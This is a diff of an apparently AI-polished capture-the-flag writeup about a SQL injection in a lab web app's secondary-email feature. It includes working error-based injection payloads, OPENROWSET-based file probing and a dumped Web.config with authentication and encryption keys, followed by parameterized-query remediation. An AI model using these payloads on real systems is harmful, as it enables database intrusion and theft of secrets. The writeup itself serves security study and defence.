@@ -1,64 +1,141 @@
-
-The Vault application's backup-email update feature is vulnerable to SQL injection. When a logged-in user submits a new secondary email address, the application checks whether the email is already in use by running a `SELECT` query. The user-supplied value is inserted directly into the SQL command string using `string.Format()`, and the preceding regex validation is weak enough to be bypassed. As a result, an attacker can inject arbitrary SQL into the query.
-
-  
-
-Because the backend uses Microsoft SQL Server and the connection is configured with database credentials, a successful injection can be escalated to dump arbitrary tables, extract sensitive records (such as stored passwords and user data), and read files from the underlying server using SQL Server primitives such as `OPENROWSET(BULK...)`, `xp_dirtree`, or error-based file reads.
+Here is your writeup cleaned up, properly structured, and formatted for readability, along with a technical breakdown and remediation guidance for the vulnerable C# snippet.
 
   
 
-## Root Cause
+## Technical Finding Summary: SQL Injection & Arbitrary File Read
 
-The root cause is unsafe dynamic SQL construction combined with ineffective input validation:
+### 1. Source Code Review
+
+While auditing `Controllers/MyController.cs`, a SQL injection vulnerability was identified in the `SecondaryEmail()` action.
 
   
 
-1. **User input concatenated into SQL**
+C#
+
+```
+cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
+```
+
+- **Vulnerability Type:** Unsanitized SQL String Concatenation / Format String Injection
     
       
     
-    In `MyController.SecondaryEmail()`, the secondary email value is embedded directly into the query string:
+- **Impact:** Direct injection into SQL queries, bypassing regex input validation logic.
     
       
     
-    C#
+
+### 2. Confirming Conditional Error-Based Injection
+
+To confirm execution, a conditional divide-by-zero payload was injected into the `secondaryEmail` parameter:
+
+  
+
+- **True Condition (`1=1`):**
+    
+      
+    
+    HTTP
     
     ```
-    cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
+    secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=1)+THEN+1/0+ELSE+NULL+END;--+-
     ```
     
-    Because there are no query parameters, any single quote (`'`) in the input terminates the string literal and alters the query's syntax and semantics.
+    - **Result:** The database executed the `THEN 1/0` branch, returning a `Divide by zero error encountered` error message.
+        
+          
+        
+- **False Condition (`1=2`):**
     
       
     
-2. **Bypassable regex validation**
-    
-      
-    
-    The validation pattern is configured as:
-    
-      
-    
-    C#
+    HTTP
     
     ```
-    string emailPattern = @"\S+@[a-z\.]+";
+    secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=2)+THEN+1/0+ELSE+NULL+END;--+-
     ```
     
-    Because it is not anchored with `^` and `$`, the `\S+` pattern permits quotes, comment markers, and SQL keywords as long as the payload ends with an `@domain.tld`-style substring. For example, `' OR 1=1--@x.com` successfully passes validation while executing injected SQL.
-    
-      
-    
-3. **Inconsistent parameterization**
-    
-      
-    
-    Although other methods within the same controller correctly utilize `SqlParameter`, this specific lookup relies on `string.Format()`, completely bypassing SQL Server's parameterization and escaping defenses.
-    
-      
-    
-4. **High-privilege database context**
-    
-      
-    
-    The connection string initialized in `DbService.GetConnectionString()` uses a dedicated SQL account with privileges sufficient to read database contents and access server files. This context elevates the impact from simple data disclosure to file-system traversal.
+    - **Result:** The query returned a normal `302 Found` HTTP redirect without error, confirming conditional boolean-based logic control.
+        
+          
+        
+
+### 3. Path Disclosure
+
+Verbosity in application error handling disclosed the physical file system path:
+
+  
+
+Plaintext
+
+```
+C:\inetpub\wwwroot\vault.royalflush.htb\Controllers\MyController.cs:192
+```
+
+This confirmed the web application root path under IIS (`C:\inetpub\wwwroot\vault.royalflush.htb\`).
+
+  
+
+### 4. File Existence Probing via `OPENROWSET(BULK...)`
+
+SQL Server's `OPENROWSET` function was abused to map the local file system. Distinct OS error codes distinguished path states:
+
+  
+
+|**OS Error Code**|**Message**|**Meaning**|
+|---|---|---|
+|**Code 3**|`The system cannot find the path specified.`|Directory/Path does not exist|
+|**Code 5**|`Access is denied.`|File/Directory exists but lacks read permission|
+|**Generic**|`The file "..." does not exist or you don't have file access rights.`|Target file missing|
+
+### 5. Exfiltration of Sensitive Configuration (`Web.config`)
+
+By leveraging chunked extraction via SQL injection, the target `Web.config` file was read from disk. The dumped configuration revealed critical application secret keys:
+
+  
+
+XML
+
+```
+<appSettings>
+  <add key="webpages:Version" value="3.0.0.0" />
+  <add key="webpages:Enabled" value="false" />
+  <add key="ClientValidationEnabled" value="true" />
+  <add key="UnobtrusiveJavaScriptEnabled" value="true" />
+  <add key="AuthKey" value="874c2f91-7346-4005-b55d-5077a54a5201" />
+  <add key="AuthCookieName" value="user" />
+  <add key="PasswordKey" value="f3d9aa53-c08d-43" />
+  <add key="PasswordIV" value="5ac8083e-8ff6-43" />
+</appSettings>
+```
+
+> **Security Impact:** Knowledge of `AuthKey`, `PasswordKey`, and `PasswordIV` allows an attacker to forge session authentication tokens (`user` cookie) and decrypt encrypted user passwords stored in the database.
+> 
+>   
+
+## Remediation & Secure Coding Practice
+
+To fix the vulnerability in `Controllers/MyController.cs`, replace raw string formatting with **parameterized queries** using `SqlParameter`. Parameterization ensures user input is treated strictly as literal data rather than executable SQL logic.
+
+  
+
+### Insecure Implementation
+
+C#
+
+```
+// Vulnerable: Direct string formatting concatenates untrusted input
+cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
+```
+
+### Secure Implementation
+
+C#
+
+```
+// Remediation: Use parameterized placeholders
+cmd.CommandText = "SELECT * FROM Users WHERE Email = @SecondaryEmail OR SecondaryEmail = @SecondaryEmail";
+cmd.Parameters.Add("@SecondaryEmail", SqlDbType.VarChar, 255).Value = secondaryEmail;
+```
+
+Additionally, ensure detailed error messages are disabled in production (`<customErrors mode="On" />` in `Web.config`) to prevent disclosing internal source code paths and database exceptions.
